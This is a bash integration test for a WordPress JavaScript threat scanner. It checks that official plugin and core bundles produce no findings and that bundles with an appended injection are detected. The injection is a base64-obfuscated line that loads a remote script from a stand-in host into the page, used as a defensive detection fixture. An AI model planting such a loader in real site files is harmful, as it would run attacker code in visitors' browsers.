#!/usr/bin/env bash
# Network integration test ONLY. No third-party code is executed or committed.
set -euo pipefail
REPO="$(cd "$(dirname "$0")/.." && pwd)"
TMP=$(mktemp -d "${TMPDIR:-/tmp}/presswarden-upstream.XXXXXX")
trap 'rm -rf "$TMP"' EXIT
mkdir -p "$TMP/packages" "$TMP/corpus"
fetch() {
  curl --fail --silent --show-error --location --proto '=https' --proto-redir '=https' \
    --connect-timeout 20 --max-time 180 --retry 2 --max-filesize 167772160 "$1" -o "$2"
}
fetch 'https://downloads.wordpress.org/plugin/elementor.4.2.4.zip' "$TMP/packages/elementor.zip"
fetch 'https://downloads.wordpress.org/plugin/wordfence.9.0.0.zip' "$TMP/packages/wordfence.zip"
fetch 'https://wordpress.org/wordpress-7.1.zip' "$TMP/packages/wordpress.zip"
(cd "$TMP/packages" && sha256sum -c "$REPO/tests/upstream-corpus.sha256")
# Extract only JS as inert text into an isolated directory, never a WordPress
# installation. Enforce path/type/size bounds before reading archive members.
python3 - "$TMP" <<'PY'
import pathlib, stat, sys, zipfile
root = pathlib.Path(sys.argv[1])
count = total = 0
for archive in sorted((root / 'packages').glob('*.zip')):
    with zipfile.ZipFile(archive) as z:
        for info in z.infolist():
            p = pathlib.PurePosixPath(info.filename)
            if info.is_dir() or p.suffix.lower() not in ('.js', '.mjs', '.cjs'):
                continue
            if p.is_absolute() or '..' in p.parts or stat.S_ISLNK(info.external_attr >> 16):
                raise SystemExit('unsafe upstream archive member')
            if info.file_size > 6 * 1024 * 1024:
                print('OUTSIDE SCAN SIZE SCOPE:', info.filename, info.file_size)
                continue
            count += 1
            total += info.file_size
            if count > 5000 or total > 512 * 1024 * 1024:
                raise SystemExit('upstream corpus budget exceeded')
            dest = root / 'corpus' / p
            dest.parent.mkdir(parents=True, exist_ok=True)
            dest.write_bytes(z.read(info))
if count < 30:
    raise SystemExit('unexpectedly small upstream corpus')
print(f'Upstream corpus: {count} JS files, {total} bytes (Elementor 4.2.4, Wordfence 9.0.0, WordPress 7.1)')
PY
find "$TMP/corpus" -type f -print0 > "$TMP/paths"
php -d memory_limit=32M "$REPO/lib/js-threat-cli.php" < "$TMP/paths" > "$TMP/results"
if [ -s "$TMP/results" ]; then
  cat "$TMP/results" >&2
  printf 'Clean upstream corpus generated findings\n' >&2
  exit 1
fi
printf 'Official upstream JS corpus: zero findings\n'

# Test actual upstream bundles with an appended synthetic injection as well.
# This demonstrates that package provenance or a familiar filename is NOT an
# allowlist. Existing upstream files remain unchanged in the clean corpus.
python3 - "$TMP" <<'PY'
import pathlib, sys
root = pathlib.Path(sys.argv[1])
candidates = [root / 'corpus/elementor/assets/js/admin.js',
              root / 'corpus/wordpress/wp-includes/js/codemirror/codemirror.min.js']
payload = b"\n;if(document.cookie.indexOf('pw_seen=')===-1){const u=atob('aHR0cHM6Ly9wYXlsb2FkLmludmFsaWQvdXBkYXRlLmpz');const s=document.createElement('script');s.src=u;document.head.appendChild(s);}\n"
with (root / 'injected-paths').open('wb') as out:
    for number, path in enumerate(candidates):
        if not path.is_file():
            raise SystemExit(f'expected corpus target missing: {path.name}')
        target = root / f'injected-{number}.js'
        target.write_bytes(path.read_bytes() + payload)
        out.write(str(target).encode() + b'\0')
PY
php -d memory_limit=32M "$REPO/lib/js-threat-cli.php" < "$TMP/injected-paths" > "$TMP/injected-results"
[ "$(grep -c 'PW-JS-002' "$TMP/injected-results")" -eq 2 ] || {
  cat "$TMP/injected-results" >&2; printf 'Injected upstream bundle was missed\n' >&2; exit 1;
}
printf 'Injected official bundles: 2/2 detected; no package-name allowlist\n'
